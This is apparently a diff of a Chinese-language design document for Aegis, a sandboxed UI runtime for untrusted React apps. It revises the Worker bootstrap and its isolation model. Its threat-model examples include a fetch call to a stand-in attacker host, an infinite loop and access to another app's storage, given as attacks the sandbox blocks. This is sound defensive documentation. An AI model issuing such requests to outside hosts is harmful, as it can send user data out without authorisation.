@@ -20,25 +20,25 @@ Aegis 是一个面向**不受信任应用**的安全 UI 运行时。
 
 Aegis 允许第三方开发者使用熟悉的：
 
-* React
-* JSX
-* Hooks
-* Component
-* State Management
+- React
+- JSX
+- Hooks
+- Component
+- State Management
 
 开发应用，同时将应用代码运行在隔离的 Worker 环境中。
 
 应用无法直接访问宿主环境的：
 
-* DOM
-* Native UI
-* 文件系统
-* 摄像头
-* 麦克风
-* 网络
-* Storage
-* Clipboard
-* 系统能力
+- DOM
+- Native UI
+- 文件系统
+- 摄像头
+- 麦克风
+- 网络
+- Storage
+- Clipboard
+- 系统能力
 
 所有与宿主的交互必须通过 Aegis 定义的：
 
@@ -105,20 +105,17 @@ Container 通过 Adapter 加载应用
   │  └─ FileSystemAdapter    文件系统
   │
   ▼
-Host 创建 Worker 进程
+Host 创建 Worker module
   │
   ▼
-加载程序包代码（Runtime 基础代码）
+转移私有 MessagePort 给 bootstrap
   │
   ▼
-注入上下文（Context）
-  │  ├─ 替换全局对象（阻止访问 postMessage 等）
-  │  ├─ 注入 Protocol Client
-  │  ├─ 注入 Capability Client
-  │  └─ 注入 Resource Tracker
+导入 Host 提供的可信 SDK ESM
+  │  └─ 在模块闭包中初始化 Protocol Client
   │
   ▼
-加载用户代码（应用入口）
+作为独立 ESM 加载用户入口
   │
   ▼
 应用运行
@@ -162,11 +159,10 @@ Adapter 负责从不同来源获取应用代码。Host 不直接加载代码，�
 Worker 创建后，Host 不直接运行用户代码。而是先注入受限上下文：
 
 ```text
-Host 注入的上下文：
-  ├── __aegis_protocol    Protocol Client（内部通道，用户不可见）
-  ├── __aegis_capability  Capability Client（内部通道，用户不可见）
-  ├── __aegis_resource    Resource Tracker（内部通道，用户不可见）
-  └── 全局对象替换         阻止访问 postMessage / self / importScripts 等
+Worker bootstrap 接收的上下文：
+  ├── 转移的 MessagePort  Host / Worker 私有桥接通道
+  ├── 宿主可信 SDK ESM    模块闭包持有协议客户端
+  └── 独立应用 ESM        只能访问 SDK 导出的公开 API
 ```
 
 用户通过框架 SDK（React Hooks / 组件）间接交互，无法直接访问 Protocol：
@@ -180,12 +176,9 @@ Host 注入的上下文：
   <AegisView> / <AegisText> / <AegisButton>
 
 用户看不到的（框架内部）：
-  __aegis_protocol.sendMessage(...)   ← 仅 Reconciler 内部使用
-  __aegis_capability.request(...)     ← 仅 SDK hooks 内部使用
-  self.postMessage(...)               ← 被拦截
-  self.close(...)                     ← 被拦截
-  importScripts(...)                  ← 被拦截
-  window / document                   ← 不存在
+  Protocol Client                     ← SDK 模块闭包状态，不是 Worker 全局属性
+  self.postMessage(...)               ← 不会被 Host 的协议处理器接收
+  window / document                   ← Worker 中不存在
 ```
 
 ---
@@ -286,13 +279,13 @@ while (true) {}
 ### 非授权网络请求
 
 ```js
-fetch("https://attacker.example")
+fetch('https://attacker.example');
 ```
 
 ### 非授权数据访问
 
 ```js
-readOtherAppStorage()
+readOtherAppStorage();
 ```
 
 ### UI 越权
